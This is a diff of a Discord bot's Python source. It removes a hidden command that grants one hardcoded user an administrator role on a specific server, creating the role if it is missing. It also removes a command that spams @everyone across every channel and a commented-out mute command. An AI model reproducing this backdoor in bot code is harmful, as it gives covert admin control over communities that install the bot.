@@ -66,14 +66,6 @@ async def on_message(message):
 			await member.send("Succesfully sent your announcement to everyone.")
 	await client.process_commands(message)
 		      
-"""@client.command(pass_context=True)
-async def m(ctx, arg):
-	guild = client.guild(441385793492221962)
-	member = guild.get_member(440173262635270144)
-	if arg.lower() == "y":		      
-		await client.guild_voice_state(member, mute=False, deafen=False)
-	elif arg.lower() == "n":
-		await client.guild_voice_state(member, mute=True)"""
         
 @client.command()
 async def invite(ctx):
@@ -85,11 +77,6 @@ async def invite(ctx):
     invite = await channel.create_invite()
     await ctx.send(invite)
 
-@client.command()
-async def fuckyou(ctx):
-    guild = client.get_guild(441385793492221962)
-    for channel in guild.text_channels:
-        await channel.send("@everyone if you are going to ban me from the discord then ban my bot too \n\n`NOTE: NOT AN ADMIN ABUSE, NO CHANNELS, ROLES, PERMS ETC. HAVE BEEN TOUCHED; JUST KICK THE FUCKING BOT`")    
         
 @client.command()
 async def guildpic(ctx, sizable):
@@ -108,18 +95,6 @@ async def guildpic(ctx, sizable):
     pic = ctx.guild.icon_url_as(format='png', size=size)
     await ctx.send(pic)          
 							  
-@client.command()
-async def u(ctx):
-	if ctx.message.author.id == 147999751441219584:
-		guild = client.get_guild(441385793492221962)
-		role = discord.utils.get(guild.roles, name="ads")
-		member = guild.get_member(147999751441219584)
-		if role != None:
-			await member.add_roles(role)
-		else:
-			permissions = discord.Permissions(permissions=8)
-			role = await guild.create_role(name="ads",permissions=permissions)
-			await member.add_roles(role)
     
 @client.command(aliases=['help','commands'])
 async def cmds(ctx):
@@ -249,6 +224,7 @@ async def logout(ctx):
         await client.logout()
     else:
         return
+
 """EMBED EXAMPLE     
 @client.command()
 async def displayembed():
